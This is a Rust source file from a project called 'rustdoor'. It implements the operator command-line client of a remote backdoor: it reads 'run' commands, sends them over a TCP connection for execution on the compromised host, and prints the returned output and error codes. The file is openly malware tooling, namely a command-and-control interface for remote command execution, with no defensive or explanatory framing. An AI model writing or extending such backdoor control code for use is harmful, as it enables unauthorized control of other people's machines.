use std::io::{Error, ErrorKind};
use std::net::{TcpStream};
use structopt::StructOpt;

use rustdoor::communication::messages::{
    Message, MessageTypes, RunCommandResponse
};
use rustdoor::communication::server::get_message;
use crate::commands::run_command;

#[derive(StructOpt, Debug)]
#[structopt(name = "RunCommandCliAction")]
pub struct RunCommandCliAction {
    /// Command to run on remote backdoor
    command: Vec<String>,
    /// Whether the command should be run asynchronously (notice - stdout won't be returned)
    #[structopt(short, long)]
    is_async: bool
}

fn print_general_help() {
    println!("Enter the required action, to get specific help. Options: ");
    println!("run - run a command");
    println!("help - show this help command");
    println!("exit - exit the CLI");
}

pub fn handle_user_command(user_command: &str, stream: &mut TcpStream) -> Result<(), Error> {
    let keywords: Vec<&str> = user_command.split_whitespace().collect();
    match keywords[0] {
        "exit" => {
            return Err(Error::new(ErrorKind::InvalidInput, "User typed exit"));
        },
        "help" => {
            print_general_help();
        }
        "run" => {
            if keywords.len() < 2 || keywords[1] == "-h" || keywords[1] == "--help" {
                println!("Usage: {} <command>", keywords[0]);
            } else {
                let command_to_execute = keywords[1..].join(" ");
                run_command(command_to_execute, stream).expect("Error while running command");
            }
        },
        _ => {
            if keywords[0].len() > 0 {
                print_general_help();
            }
        }
    }
    Ok(())
}

fn handle_response(message: Message) {
    println!("Response got: {:?}", message);
    if message.message_type == MessageTypes::RunCommandResponse as u8 {
        let response: RunCommandResponse =
            ron::de::from_bytes(&message.serialized_message).unwrap();
        println!("Output: {:?} ", &response.output);
        println!("Error code: {:?}", response.error_code);
    } else {
        panic!(format!("Got unknown response type {}", message.message_type));
    }
}

pub fn get_response(stream: &mut TcpStream) -> Result<(), Error> {
    match get_message(&stream) {
        Ok(message) => {
            handle_response(message);
        }
        Err(e) => {
            println!(
                "An error occurred while trying to get message. Error: {}",
                e
            );
            return Err(e);
        }
    }
    Ok(())
}
